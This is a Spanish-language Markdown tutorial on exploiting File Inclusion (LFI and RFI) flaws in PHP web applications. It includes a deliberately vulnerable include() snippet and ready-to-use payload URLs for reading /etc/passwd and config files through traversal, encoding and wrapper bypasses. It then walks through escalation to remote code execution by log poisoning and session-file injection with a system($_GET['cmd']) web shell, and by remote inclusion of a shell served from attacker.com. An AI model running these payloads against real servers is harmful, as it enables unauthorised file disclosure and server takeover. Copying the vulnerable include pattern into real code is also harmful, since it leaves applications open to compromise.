# 🛠️ Ejecución de File Inclusion (LFI & RFI)

**File Inclusion** es una vulnerabilidad web que permite a un atacante incluir archivos en el servidor mediante parámetros mal validados en una aplicación web. Existen dos tipos principales:

- **LFI (Local File Inclusion)**: Permite incluir archivos locales del servidor.
- **RFI (Remote File Inclusion)**: Permite incluir archivos remotos, lo que facilita la ejecución de código malicioso.

---

## 📌 **Ejemplo de código vulnerable en PHP**

El siguiente código PHP es vulnerable a File Inclusion porque no filtra adecuadamente la entrada del usuario en la variable `$_GET['file']`:

```php
<?php
$file = $_GET['file'];
include($file);
?>
```

Esto permite a un atacante manipular la ruta del archivo y acceder a archivos internos del sistema o ejecutar código arbitrario.

---

## 🔍 **Ejemplos de explotación de LFI**

### 📂 **Lectura de archivos sensibles**

En sistemas UNIX/Linux, es posible leer archivos críticos del sistema, como `/etc/passwd`, que almacena información de usuarios:

```bash
http://target.com/index.php?file=/etc/passwd
```

Para superar restricciones en la ruta, se usa **Path Traversal**:

```bash
http://target.com/index.php?file=../../../../etc/passwd
```

Algunos servidores implementan filtros básicos, pero pueden ser evitados usando técnicas como:

### 🛠️ **Bypass de filtros**

#### 🔹 **Uso de doble codificación**

Se usa codificación URL para evadir filtros que bloquean `../`:

```bash
http://target.com/index.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

#### 🔹 **Uso de null byte (obsoleto en PHP 7+)**

Antiguamente, `null byte` (`%00`) se usaba para truncar extensiones forzadas:

```bash
http://target.com/index.php?file=/etc/passwd%00
```

#### 🔹 **Uso de PHP Wrappers**

PHP tiene **envoltorios (wrappers)** que pueden ser explotados para leer archivos:

```bash
http://target.com/index.php?file=php://filter/convert.base64-encode/resource=config.php
```

Esto devuelve `config.php` codificado en Base64, útil para evadir restricciones.

---

## 💀 **Escalada a RCE desde LFI**

Si el servidor permite la ejecución de código PHP a través de archivos accesibles mediante LFI, es posible lograr ejecución remota de comandos (**RCE**).

### 📝 **Ejemplo con Log Poisoning**

**Log Poisoning** es una técnica en la que un atacante inyecta código malicioso en archivos de logs del servidor y luego los ejecuta a través de LFI.

#### 🔹 **Pasos para explotar Log Poisoning**

1️⃣ **Inyectar código PHP en el log de Apache usando la User-Agent**

```bash
curl -A "<?php system($_GET['cmd']); ?>" http://target.com/
```

Esto inserta código PHP malicioso en los logs de acceso del servidor web.

2️⃣ **Identificar la ubicación del log de acceso del servidor**

Ubicaciones comunes de logs en Apache y Nginx:

```bash
/var/log/apache2/access.log
/var/log/httpd/access.log
/var/log/nginx/access.log
```

3️⃣ **Ejecutar comandos a través del LFI**

```bash
http://target.com/index.php?file=/var/log/apache2/access.log&cmd=id
```

Si el servidor ejecuta PHP dentro del archivo de log, podremos ejecutar comandos en el sistema.

#### 🔹 **Explotación con logs de sesiones PHP**

Si el servidor almacena sesiones PHP en archivos locales, podemos inyectar código en ellas:

1️⃣ **Modificar la sesión PHP para incluir código malicioso**

```bash
echo "<?php system($_GET['cmd']); ?>" > /var/lib/php/sessions/sess_12345
```

2️⃣ **Acceder al archivo de sesión a través de LFI**

```bash
http://target.com/index.php?file=/var/lib/php/sessions/sess_12345&cmd=id
```

Esto permite la ejecución de comandos en el servidor.

---

## 🌍 **Remote File Inclusion (RFI)**

Si el servidor permite la inclusión de archivos remotos, podemos alojar un archivo malicioso y forzar su ejecución.

### ☁️ **Ejemplo de RFI con PHP**

1️⃣ **Subir nuestra shell maliciosa a un servidor controlado por el atacante**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8080
```

2️⃣ **Forzar la inclusión del archivo remoto**

```bash
http://target.com/index.php?file=http://attacker.com:8080/shell.php&cmd=id
```

Si el servidor ejecuta el contenido del archivo, hemos logrado RCE.

---

